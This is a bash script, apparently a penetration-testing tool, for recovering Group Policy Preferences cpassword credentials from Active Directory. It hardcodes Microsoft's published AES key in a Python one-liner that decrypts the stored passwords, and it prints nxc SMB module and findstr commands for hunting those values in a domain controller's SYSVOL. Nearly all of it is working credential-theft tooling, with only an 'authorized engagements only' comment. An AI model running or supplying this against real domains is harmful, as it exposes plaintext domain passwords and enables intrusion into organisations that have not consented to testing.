#!/usr/bin/env bash
# gpp-decrypt.sh -- Group Policy Preferences cpassword recovery (DECRYPT, no GPU).
# Microsoft published the AES key for GPP cpassword, so any cpassword found in
# SYSVOL is reversible instantly -- never crack it. Still shows up in real AD.
# Authorized engagements only.
#
# Usage:
#   ./gpp-decrypt.sh find  <domain> <user> <password> <dc-ip>   # hunt SYSVOL
#   ./gpp-decrypt.sh crack <cpassword-blob>                     # decrypt one value
set -euo pipefail
MODE="${1:?find|crack}"

if [[ "$MODE" == "crack" ]]; then
  CP="${2:?cpassword}"
  echo "[*] Decrypting cpassword..."
  gpp-decrypt "$CP" 2>/dev/null || \
  python3 -c "import base64,sys; from Crypto.Cipher import AES; \
b=base64.b64decode('$CP'+'='*((4-len('$CP')%4)%4)); \
k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'); \
print(AES.new(k,AES.MODE_CBC,bytes(16)).decrypt(b).decode('utf-16-le').rstrip('\x00\x08\x0b\x0c\x0e\x0f'))"
  exit 0
fi

DOMAIN="${2:?domain}"; USER="${3:?user}"; PASS="${4:?password}"; DC="${5:?dc-ip}"
echo "[*] Hunting GPP cpassword in SYSVOL..."
echo "    nxc smb $DC -u '$USER' -p '$PASS' -M gpp_password"
echo "    nxc smb $DC -u '$USER' -p '$PASS' -M gpp_autologin"
echo "    # or mount SYSVOL and grep: findstr /S /I cpassword \\\\$DC\\SYSVOL\\*.xml"
echo
echo "[i] Any hit -> ./gpp-decrypt.sh crack <cpassword>. Instant, no GPU."
